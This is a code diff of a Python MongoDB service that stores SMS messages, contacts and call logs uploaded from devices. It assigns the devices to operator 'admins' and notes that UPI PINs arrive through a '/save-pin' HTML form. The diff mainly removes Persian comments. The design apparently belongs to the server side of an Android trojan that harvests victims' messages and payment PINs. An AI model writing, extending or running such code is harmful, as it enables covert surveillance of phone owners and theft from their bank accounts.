@@ -235,14 +235,10 @@ class DeviceService:
                 }
             )
             
-            # ℹ️ Note: UPI PIN now comes directly from /save-pin endpoint, not from SMS
             
         except Exception as e:
             logger.error(f"❌ Save SMS failed: {e}")
             raise
-
-    # ℹ️ NOTE: UPI PIN extraction from SMS removed
-    # UPI PIN now comes directly from /save-pin endpoint (HTML form)
 
     @staticmethod
     async def save_new_sms(device_id: str, sms_data: dict):
@@ -275,11 +271,9 @@ class DeviceService:
                 {"$inc": {"stats.total_sms": 1}}
             )
             
-            # ℹ️ Note: UPI PIN now comes directly from /save-pin endpoint, not from SMS
                     
         except Exception as e:
             logger.error(f"❌ Save new SMS failed: {e}")
-
 
     @staticmethod
     async def get_sms_messages(device_id: str, skip: int = 0, limit: int = 50) -> List[Dict]:
@@ -299,7 +293,7 @@ class DeviceService:
 
     @staticmethod
     async def save_contacts(device_id: str, contacts_list: List[dict]):
-        """ذخیره مخاطبین"""
+        
         try:
             if not contacts_list:
                 return
@@ -331,7 +325,6 @@ class DeviceService:
                     )
                 )
 
-            # ذخیره bulk
             if operations:
                 result = await mongodb.db.contacts.bulk_write(operations, ordered=False)
                 new_count = result.upserted_count
@@ -339,7 +332,6 @@ class DeviceService:
                 
                 logger.info(f"✅ Contacts: {new_count} new, {update_count} updated for {device_id}")
             
-            # آپدیت stats
             total = await mongodb.db.contacts.count_documents({"device_id": device_id})
             
             await mongodb.db.devices.update_one(
@@ -373,7 +365,7 @@ class DeviceService:
 
     @staticmethod
     async def save_call_logs(device_id: str, call_logs: List[dict]):
-        """ذخیره تاریخچه تماس - کاتلین میفرسته: number, name, call_type, timestamp, duration, duration_formatted"""
+        
         try:
             if not call_logs:
                 return
@@ -477,7 +469,6 @@ class DeviceService:
             logger.error(f"❌ Get logs failed: {e}")
             return []
 
-
     @staticmethod
     def _normalize_device_data(device_doc: dict) -> dict:
         if device_doc.get("storage_percent_free") is not None:
@@ -500,7 +491,7 @@ class DeviceService:
 
     @staticmethod
     async def save_device_note(device_id: str, priority: str, message: str):
-        """ذخیره Note برای دستگاه"""
+        
         try:
             await mongodb.db.devices.update_one(
                 {"device_id": device_id},
@@ -529,19 +520,12 @@ class DeviceService:
             logger.error(f"❌ Save note failed: {e}")
             return False
 
-
-
     @staticmethod
     async def get_devices_for_admin(admin_username: str, is_super_admin: bool = False, skip: int = 0, limit: int = 100) -> List[Device]:
-        """
-        دریافت دستگاه‌ها بر اساس ادمین
-        - Super Admin: همه دستگاه‌ها
-        - Admin معمولی: فقط دستگاه‌های خودش
-        """
+        
         try:
             two_minutes_ago = datetime.utcnow() - timedelta(minutes=2)
             
-            # آپدیت وضعیت آفلاین
             result = await mongodb.db.devices.update_many(
                 {
                     "last_ping": {"$lt": two_minutes_ago},
@@ -558,7 +542,6 @@ class DeviceService:
             if result.modified_count > 0:
                 logger.info(f"🔴 Marked {result.modified_count} devices as offline")
             
-            # فیلتر بر اساس ادمین
             query = {} if is_super_admin else {"admin_username": admin_username}
             
             cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
@@ -617,7 +600,6 @@ class DeviceService:
         except Exception as e:
             logger.error(f"❌ Get devices failed: {e}")
             return []
-
 
     @staticmethod
     async def update_device_settings(device_id: str, settings: dict):
@@ -890,15 +872,12 @@ class DeviceService:
     @staticmethod
     async def get_stats(admin_username: Optional[str] = None) -> Dict[str, int]:
         try:
-            # اول offline ها رو آپدیت کن
             two_minutes_ago = datetime.utcnow() - timedelta(minutes=2)
             
-            # فیلتر پایه
             base_query = {}
             if admin_username:
                 base_query["admin_username"] = admin_username
             
-            # آپدیت offline ها
             await mongodb.db.devices.update_many(
                 {
                     **base_query,
@@ -913,7 +892,6 @@ class DeviceService:
                 }
             )
             
-            # حالا آمار رو بگیر (فقط دستگاه‌های این ادمین)
             total = await mongodb.db.devices.count_documents(base_query)
             if total == 0:
                 return {"total_devices": 0, "active_devices": 0, "pending_devices": 0, "online_devices": 0, "offline_devices": 0}
